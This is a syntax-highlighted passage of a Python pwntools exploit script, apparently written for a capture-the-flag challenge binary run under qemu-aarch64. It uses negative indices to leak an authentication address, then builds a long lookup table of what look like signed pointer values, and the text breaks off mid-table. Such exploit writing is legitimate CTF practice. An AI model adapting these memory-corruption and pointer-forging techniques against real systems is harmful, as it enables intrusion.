<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;qemu-aarch64&#34;</span><span class="p">,</span> <span class="s2">&#34;-cpu&#34;</span><span class="p">,</span> <span class="s2">&#34;max&#34;</span><span class="p">,</span>  <span class="s2">&#34;-L&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;./chall&#34;</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">ch</span><span class="p">):</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ch</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">lock</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
  <span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  
<span class="k">def</span> <span class="nf">auth</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
  <span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
  <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
  
<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
  <span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">name</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400FF8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10A9FC70042</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;name: &#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="n">lock</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
<span class="n">show</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;name: &#34;</span><span class="p">)</span>
<span class="n">auth_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;auth_addr : @&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">auth_addr</span><span class="p">))</span>

<span class="n">lock</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">auth</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span>    <span class="mh">0x10217c8ccc5af919</span> <span class="p">:</span> <span class="mh">0x400ff8</span><span class="p">,</span>
    <span class="mh">0x10a068a44d5af919</span> <span class="p">:</span> <span class="mh">0x1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x112354ddce5af919</span> <span class="p">:</span> <span class="mh">0x2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x11a240f54f5af919</span> <span class="p">:</span> <span class="mh">0x3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x12252c2ec85af919</span> <span class="p">:</span> <span class="mh">0x4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x12a43806495af919</span> <span class="p">:</span> <span class="mh">0x5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1327047fca5af919</span> <span class="p">:</span> <span class="mh">0x6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x13a610574b5af919</span> <span class="p">:</span> <span class="mh">0x7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1429ddc8c45af919</span> <span class="p">:</span> <span class="mh">0x8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x14a8c9e0455af919</span> <span class="p">:</span> <span class="mh">0x9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x152bf599c65af919</span> <span class="p">:</span> <span class="mh">0xa000000400ff8</span><span class="p">,</span>
    <span class="mh">0x15aae1b1475af919</span> <span class="p">:</span> <span class="mh">0xb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x162d8d6ac05af919</span> <span class="p">:</span> <span class="mh">0xc000000400ff8</span><span class="p">,</span>
    <span class="mh">0x16ac9942415af919</span> <span class="p">:</span> <span class="mh">0xd000000400ff8</span><span class="p">,</span>
    <span class="mh">0x172fa53bc25af919</span> <span class="p">:</span> <span class="mh">0xe000000400ff8</span><span class="p">,</span>
    <span class="mh">0x17aeb113435af919</span> <span class="p">:</span> <span class="mh">0xf000000400ff8</span><span class="p">,</span>
    <span class="mh">0x18303e04dc5af919</span> <span class="p">:</span> <span class="mh">0x10000000400ff8</span><span class="p">,</span>
    <span class="mh">0x18b12a2c5d5af919</span> <span class="p">:</span> <span class="mh">0x11000000400ff8</span><span class="p">,</span>
    <span class="mh">0x19321655de5af919</span> <span class="p">:</span> <span class="mh">0x12000000400ff8</span><span class="p">,</span>
    <span class="mh">0x19b3027d5f5af919</span> <span class="p">:</span> <span class="mh">0x13000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1a346ea6d85af919</span> <span class="p">:</span> <span class="mh">0x14000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1ab57a8e595af919</span> <span class="p">:</span> <span class="mh">0x15000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1b3646f7da5af919</span> <span class="p">:</span> <span class="mh">0x16000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1bb752df5b5af919</span> <span class="p">:</span> <span class="mh">0x17000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1c389f40d45af919</span> <span class="p">:</span> <span class="mh">0x18000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1cb98b68555af919</span> <span class="p">:</span> <span class="mh">0x19000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1d3ab711d65af919</span> <span class="p">:</span> <span class="mh">0x1a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1dbba339575af919</span> <span class="p">:</span> <span class="mh">0x1b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1e3ccfe2d05af919</span> <span class="p">:</span> <span class="mh">0x1c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1ebddbca515af919</span> <span class="p">:</span> <span class="mh">0x1d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1f3ee7b3d25af919</span> <span class="p">:</span> <span class="mh">0x1e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x1fbff39b535af919</span> <span class="p">:</span> <span class="mh">0x1f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3f99cec5af919</span> <span class="p">:</span> <span class="mh">0x20000000400ff8</span><span class="p">,</span>
    <span class="mh">0x82edb46d5af919</span> <span class="p">:</span> <span class="mh">0x21000000400ff8</span><span class="p">,</span>
    <span class="mh">0x101d1cdee5af919</span> <span class="p">:</span> <span class="mh">0x22000000400ff8</span><span class="p">,</span>
    <span class="mh">0x180c5e56f5af919</span> <span class="p">:</span> <span class="mh">0x23000000400ff8</span><span class="p">,</span>
    <span class="mh">0x207a93ee85af919</span> <span class="p">:</span> <span class="mh">0x24000000400ff8</span><span class="p">,</span>
    <span class="mh">0x286bd16695af919</span> <span class="p">:</span> <span class="mh">0x25000000400ff8</span><span class="p">,</span>
    <span class="mh">0x305816fea5af919</span> <span class="p">:</span> <span class="mh">0x26000000400ff8</span><span class="p">,</span>
    <span class="mh">0x38495476b5af919</span> <span class="p">:</span> <span class="mh">0x27000000400ff8</span><span class="p">,</span>
    <span class="mh">0x40b58d8e45af919</span> <span class="p">:</span> <span class="mh">0x28000000400ff8</span><span class="p">,</span>
    <span class="mh">0x48a4cf0655af919</span> <span class="p">:</span> <span class="mh">0x29000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5097089e65af919</span> <span class="p">:</span> <span class="mh">0x2a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x58864a1675af919</span> <span class="p">:</span> <span class="mh">0x2b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x60f087ae05af919</span> <span class="p">:</span> <span class="mh">0x2c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x68e1c52615af919</span> <span class="p">:</span> <span class="mh">0x2d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x70d202be25af919</span> <span class="p">:</span> <span class="mh">0x2e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x78c3403635af919</span> <span class="p">:</span> <span class="mh">0x2f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x812bb14fc5af919</span> <span class="p">:</span> <span class="mh">0x30000000400ff8</span><span class="p">,</span>
    <span class="mh">0x893af3c7d5af919</span> <span class="p">:</span> <span class="mh">0x31000000400ff8</span><span class="p">,</span>
    <span class="mh">0x9109345fe5af919</span> <span class="p">:</span> <span class="mh">0x32000000400ff8</span><span class="p">,</span>
    <span class="mh">0x991876d7f5af919</span> <span class="p">:</span> <span class="mh">0x33000000400ff8</span><span class="p">,</span>
    <span class="mh">0xa16ebb6f85af919</span> <span class="p">:</span> <span class="mh">0x34000000400ff8</span><span class="p">,</span>
    <span class="mh">0xa97ff9e795af919</span> <span class="p">:</span> <span class="mh">0x35000000400ff8</span><span class="p">,</span>
    <span class="mh">0xb14c3e7fa5af919</span> <span class="p">:</span> <span class="mh">0x36000000400ff8</span><span class="p">,</span>
    <span class="mh">0xb95d7cf7b5af919</span> <span class="p">:</span> <span class="mh">0x37000000400ff8</span><span class="p">,</span>
    <span class="mh">0xc1a1a50f45af919</span> <span class="p">:</span> <span class="mh">0x38000000400ff8</span><span class="p">,</span>
    <span class="mh">0xc9b0e78755af919</span> <span class="p">:</span> <span class="mh">0x39000000400ff8</span><span class="p">,</span>
    <span class="mh">0xd183201f65af919</span> <span class="p">:</span> <span class="mh">0x3a000000400ff8</span><span class="p">,</span>
    <span class="mh">0xd992629775af919</span> <span class="p">:</span> <span class="mh">0x3b000000400ff8</span><span class="p">,</span>
    <span class="mh">0xe1e4af2f05af919</span> <span class="p">:</span> <span class="mh">0x3c000000400ff8</span><span class="p">,</span>
    <span class="mh">0xe9f5eda715af919</span> <span class="p">:</span> <span class="mh">0x3d000000400ff8</span><span class="p">,</span>
    <span class="mh">0xf1c62a3f25af919</span> <span class="p">:</span> <span class="mh">0x3e000000400ff8</span><span class="p">,</span>
    <span class="mh">0xf9d768b735af919</span> <span class="p">:</span> <span class="mh">0x3f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x306476ac8c5af919</span> <span class="p">:</span> <span class="mh">0x40000000400ff8</span><span class="p">,</span>
    <span class="mh">0x30e562840d5af919</span> <span class="p">:</span> <span class="mh">0x41000000400ff8</span><span class="p">,</span>
    <span class="mh">0x31665efd8e5af919</span> <span class="p">:</span> <span class="mh">0x42000000400ff8</span><span class="p">,</span>
    <span class="mh">0x31e74ad50f5af919</span> <span class="p">:</span> <span class="mh">0x43000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3260260e885af919</span> <span class="p">:</span> <span class="mh">0x44000000400ff8</span><span class="p">,</span>
    <span class="mh">0x32e13226095af919</span> <span class="p">:</span> <span class="mh">0x45000000400ff8</span><span class="p">,</span>
    <span class="mh">0x33620e5f8a5af919</span> <span class="p">:</span> <span class="mh">0x46000000400ff8</span><span class="p">,</span>
    <span class="mh">0x33e31a770b5af919</span> <span class="p">:</span> <span class="mh">0x47000000400ff8</span><span class="p">,</span>
    <span class="mh">0x346cd7e8845af919</span> <span class="p">:</span> <span class="mh">0x48000000400ff8</span><span class="p">,</span>
    <span class="mh">0x34edc3c0055af919</span> <span class="p">:</span> <span class="mh">0x49000000400ff8</span><span class="p">,</span>
    <span class="mh">0x356effb9865af919</span> <span class="p">:</span> <span class="mh">0x4a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x35efeb91075af919</span> <span class="p">:</span> <span class="mh">0x4b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3668874a805af919</span> <span class="p">:</span> <span class="mh">0x4c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x36e99362015af919</span> <span class="p">:</span> <span class="mh">0x4d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x376aaf1b825af919</span> <span class="p">:</span> <span class="mh">0x4e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x37ebbb33035af919</span> <span class="p">:</span> <span class="mh">0x4f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x387534249c5af919</span> <span class="p">:</span> <span class="mh">0x50000000400ff8</span><span class="p">,</span>
    <span class="mh">0x38f4200c1d5af919</span> <span class="p">:</span> <span class="mh">0x51000000400ff8</span><span class="p">,</span>
    <span class="mh">0x39771c759e5af919</span> <span class="p">:</span> <span class="mh">0x52000000400ff8</span><span class="p">,</span>
    <span class="mh">0x39f6085d1f5af919</span> <span class="p">:</span> <span class="mh">0x53000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3a716486985af919</span> <span class="p">:</span> <span class="mh">0x54000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3af070ae195af919</span> <span class="p">:</span> <span class="mh">0x55000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3b734cd79a5af919</span> <span class="p">:</span> <span class="mh">0x56000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3bf258ff1b5af919</span> <span class="p">:</span> <span class="mh">0x57000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3c7d9560945af919</span> <span class="p">:</span> <span class="mh">0x58000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3cfc8148155af919</span> <span class="p">:</span> <span class="mh">0x59000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3d7fbd31965af919</span> <span class="p">:</span> <span class="mh">0x5a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3dfea919175af919</span> <span class="p">:</span> <span class="mh">0x5b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3e79c5c2905af919</span> <span class="p">:</span> <span class="mh">0x5c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3ef8d1ea115af919</span> <span class="p">:</span> <span class="mh">0x5d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3f7bed93925af919</span> <span class="p">:</span> <span class="mh">0x5e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x3ffaf9bb135af919</span> <span class="p">:</span> <span class="mh">0x5f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2046f3bcac5af919</span> <span class="p">:</span> <span class="mh">0x60000000400ff8</span><span class="p">,</span>
    <span class="mh">0x20c7e7942d5af919</span> <span class="p">:</span> <span class="mh">0x61000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2144dbedae5af919</span> <span class="p">:</span> <span class="mh">0x62000000400ff8</span><span class="p">,</span>
    <span class="mh">0x21c5cfc52f5af919</span> <span class="p">:</span> <span class="mh">0x63000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2242a31ea85af919</span> <span class="p">:</span> <span class="mh">0x64000000400ff8</span><span class="p">,</span>
    <span class="mh">0x22c3b736295af919</span> <span class="p">:</span> <span class="mh">0x65000000400ff8</span><span class="p">,</span>
    <span class="mh">0x23408b4faa5af919</span> <span class="p">:</span> <span class="mh">0x66000000400ff8</span><span class="p">,</span>
    <span class="mh">0x23c19f672b5af919</span> <span class="p">:</span> <span class="mh">0x67000000400ff8</span><span class="p">,</span>
    <span class="mh">0x244e52f8a45af919</span> <span class="p">:</span> <span class="mh">0x68000000400ff8</span><span class="p">,</span>
    <span class="mh">0x24cf46d0255af919</span> <span class="p">:</span> <span class="mh">0x69000000400ff8</span><span class="p">,</span>
    <span class="mh">0x254c7aa9a65af919</span> <span class="p">:</span> <span class="mh">0x6a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x25cd6e81275af919</span> <span class="p">:</span> <span class="mh">0x6b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x264a025aa05af919</span> <span class="p">:</span> <span class="mh">0x6c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x26cb1672215af919</span> <span class="p">:</span> <span class="mh">0x6d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x27482a0ba25af919</span> <span class="p">:</span> <span class="mh">0x6e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x27c93e23235af919</span> <span class="p">:</span> <span class="mh">0x6f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2857b134bc5af919</span> <span class="p">:</span> <span class="mh">0x70000000400ff8</span><span class="p">,</span>
    <span class="mh">0x28d6a51c3d5af919</span> <span class="p">:</span> <span class="mh">0x71000000400ff8</span><span class="p">,</span>
    <span class="mh">0x29559965be5af919</span> <span class="p">:</span> <span class="mh">0x72000000400ff8</span><span class="p">,</span>
    <span class="mh">0x29d48d4d3f5af919</span> <span class="p">:</span> <span class="mh">0x73000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2a53e196b85af919</span> <span class="p">:</span> <span class="mh">0x74000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2ad2f5be395af919</span> <span class="p">:</span> <span class="mh">0x75000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2b51c9c7ba5af919</span> <span class="p">:</span> <span class="mh">0x76000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2bd0ddef3b5af919</span> <span class="p">:</span> <span class="mh">0x77000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2c5f1070b45af919</span> <span class="p">:</span> <span class="mh">0x78000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2cde0458355af919</span> <span class="p">:</span> <span class="mh">0x79000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2d5d3821b65af919</span> <span class="p">:</span> <span class="mh">0x7a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2ddc2c09375af919</span> <span class="p">:</span> <span class="mh">0x7b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2e5b40d2b05af919</span> <span class="p">:</span> <span class="mh">0x7c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2eda54fa315af919</span> <span class="p">:</span> <span class="mh">0x7d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2f596883b25af919</span> <span class="p">:</span> <span class="mh">0x7e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x2fd87cab335af919</span> <span class="p">:</span> <span class="mh">0x7f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x50ab68cc4c5af919</span> <span class="p">:</span> <span class="mh">0x80000000400ff8</span><span class="p">,</span>
    <span class="mh">0x502a7ce4cd5af919</span> <span class="p">:</span> <span class="mh">0x81000000400ff8</span><span class="p">,</span>
    <span class="mh">0x51a9409d4e5af919</span> <span class="p">:</span> <span class="mh">0x82000000400ff8</span><span class="p">,</span>
    <span class="mh">0x512854b5cf5af919</span> <span class="p">:</span> <span class="mh">0x83000000400ff8</span><span class="p">,</span>
    <span class="mh">0x52af386e485af919</span> <span class="p">:</span> <span class="mh">0x84000000400ff8</span><span class="p">,</span>
    <span class="mh">0x522e2c46c95af919</span> <span class="p">:</span> <span class="mh">0x85000000400ff8</span><span class="p">,</span>
    <span class="mh">0x53ad103f4a5af919</span> <span class="p">:</span> <span class="mh">0x86000000400ff8</span><span class="p">,</span>
    <span class="mh">0x532c0417cb5af919</span> <span class="p">:</span> <span class="mh">0x87000000400ff8</span><span class="p">,</span>
    <span class="mh">0x54a3c988445af919</span> <span class="p">:</span> <span class="mh">0x88000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5422dda0c55af919</span> <span class="p">:</span> <span class="mh">0x89000000400ff8</span><span class="p">,</span>
    <span class="mh">0x55a1e1d9465af919</span> <span class="p">:</span> <span class="mh">0x8a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5520f5f1c75af919</span> <span class="p">:</span> <span class="mh">0x8b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x56a7992a405af919</span> <span class="p">:</span> <span class="mh">0x8c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x56268d02c15af919</span> <span class="p">:</span> <span class="mh">0x8d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x57a5b17b425af919</span> <span class="p">:</span> <span class="mh">0x8e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5724a553c35af919</span> <span class="p">:</span> <span class="mh">0x8f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x58ba2a445c5af919</span> <span class="p">:</span> <span class="mh">0x90000000400ff8</span><span class="p">,</span>
    <span class="mh">0x583b3e6cdd5af919</span> <span class="p">:</span> <span class="mh">0x91000000400ff8</span><span class="p">,</span>
    <span class="mh">0x59b802155e5af919</span> <span class="p">:</span> <span class="mh">0x92000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5939163ddf5af919</span> <span class="p">:</span> <span class="mh">0x93000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5abe7ae6585af919</span> <span class="p">:</span> <span class="mh">0x94000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5a3f6eced95af919</span> <span class="p">:</span> <span class="mh">0x95000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5bbc52b75a5af919</span> <span class="p">:</span> <span class="mh">0x96000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5b3d469fdb5af919</span> <span class="p">:</span> <span class="mh">0x97000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5cb28b00545af919</span> <span class="p">:</span> <span class="mh">0x98000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5c339f28d55af919</span> <span class="p">:</span> <span class="mh">0x99000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5db0a351565af919</span> <span class="p">:</span> <span class="mh">0x9a000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5d31b779d75af919</span> <span class="p">:</span> <span class="mh">0x9b000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5eb6dba2505af919</span> <span class="p">:</span> <span class="mh">0x9c000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5e37cf8ad15af919</span> <span class="p">:</span> <span class="mh">0x9d000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5fb4f3f3525af919</span> <span class="p">:</span> <span class="mh">0x9e000000400ff8</span><span class="p">,</span>
    <span class="mh">0x5f35e7dbd35af919</span> <span class="p">:</span> <span class="mh">0x9f000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4089eddc6c5af919</span> <span class="p">:</span> <span class="mh">0xa0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4008f9f4ed5af919</span> <span class="p">:</span> <span class="mh">0xa1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x418bc58d6e5af919</span> <span class="p">:</span> <span class="mh">0xa2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x410ad1a5ef5af919</span> <span class="p">:</span> <span class="mh">0xa3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x428dbd7e685af919</span> <span class="p">:</span> <span class="mh">0xa4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x420ca956e95af919</span> <span class="p">:</span> <span class="mh">0xa5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x438f952f6a5af919</span> <span class="p">:</span> <span class="mh">0xa6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x430e8107eb5af919</span> <span class="p">:</span> <span class="mh">0xa7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x44814c98645af919</span> <span class="p">:</span> <span class="mh">0xa8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x440058b0e55af919</span> <span class="p">:</span> <span class="mh">0xa9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x458364c9665af919</span> <span class="p">:</span> <span class="mh">0xaa000000400ff8</span><span class="p">,</span>
    <span class="mh">0x450270e1e75af919</span> <span class="p">:</span> <span class="mh">0xab000000400ff8</span><span class="p">,</span>
    <span class="mh">0x46851c3a605af919</span> <span class="p">:</span> <span class="mh">0xac000000400ff8</span><span class="p">,</span>
    <span class="mh">0x46040812e15af919</span> <span class="p">:</span> <span class="mh">0xad000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4787346b625af919</span> <span class="p">:</span> <span class="mh">0xae000000400ff8</span><span class="p">,</span>
    <span class="mh">0x47062043e35af919</span> <span class="p">:</span> <span class="mh">0xaf000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4898af547c5af919</span> <span class="p">:</span> <span class="mh">0xb0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4819bb7cfd5af919</span> <span class="p">:</span> <span class="mh">0xb1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x499a87057e5af919</span> <span class="p">:</span> <span class="mh">0xb2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x491b932dff5af919</span> <span class="p">:</span> <span class="mh">0xb3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4a9cfff6785af919</span> <span class="p">:</span> <span class="mh">0xb4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4a1debdef95af919</span> <span class="p">:</span> <span class="mh">0xb5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4b9ed7a77a5af919</span> <span class="p">:</span> <span class="mh">0xb6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4b1fc38ffb5af919</span> <span class="p">:</span> <span class="mh">0xb7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4c900e10745af919</span> <span class="p">:</span> <span class="mh">0xb8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4c111a38f55af919</span> <span class="p">:</span> <span class="mh">0xb9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4d922641765af919</span> <span class="p">:</span> <span class="mh">0xba000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4d133269f75af919</span> <span class="p">:</span> <span class="mh">0xbb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4e945eb2705af919</span> <span class="p">:</span> <span class="mh">0xbc000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4e154a9af15af919</span> <span class="p">:</span> <span class="mh">0xbd000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4f9676e3725af919</span> <span class="p">:</span> <span class="mh">0xbe000000400ff8</span><span class="p">,</span>
    <span class="mh">0x4f1762cbf35af919</span> <span class="p">:</span> <span class="mh">0xbf000000400ff8</span><span class="p">,</span>
    <span class="mh">0x70ee62ec0c5af919</span> <span class="p">:</span> <span class="mh">0xc0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x706f76c48d5af919</span> <span class="p">:</span> <span class="mh">0xc1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x71ec4abd0e5af919</span> <span class="p">:</span> <span class="mh">0xc2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x716d5e958f5af919</span> <span class="p">:</span> <span class="mh">0xc3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x72ea324e085af919</span> <span class="p">:</span> <span class="mh">0xc4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x726b2666895af919</span> <span class="p">:</span> <span class="mh">0xc5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x73e81a1f0a5af919</span> <span class="p">:</span> <span class="mh">0xc6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x73690e378b5af919</span> <span class="p">:</span> <span class="mh">0xc7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x74e6c3a8045af919</span> <span class="p">:</span> <span class="mh">0xc8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7467d780855af919</span> <span class="p">:</span> <span class="mh">0xc9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x75e4ebf9065af919</span> <span class="p">:</span> <span class="mh">0xca000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7565ffd1875af919</span> <span class="p">:</span> <span class="mh">0xcb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x76e2930a005af919</span> <span class="p">:</span> <span class="mh">0xcc000000400ff8</span><span class="p">,</span>
    <span class="mh">0x76638722815af919</span> <span class="p">:</span> <span class="mh">0xcd000000400ff8</span><span class="p">,</span>
    <span class="mh">0x77e0bb5b025af919</span> <span class="p">:</span> <span class="mh">0xce000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7761af73835af919</span> <span class="p">:</span> <span class="mh">0xcf000000400ff8</span><span class="p">,</span>
    <span class="mh">0x78ff20641c5af919</span> <span class="p">:</span> <span class="mh">0xd0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x787e344c9d5af919</span> <span class="p">:</span> <span class="mh">0xd1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x79fd08351e5af919</span> <span class="p">:</span> <span class="mh">0xd2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x797c1c1d9f5af919</span> <span class="p">:</span> <span class="mh">0xd3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7afb70c6185af919</span> <span class="p">:</span> <span class="mh">0xd4000000400ff8</span><span class="p">,</span>
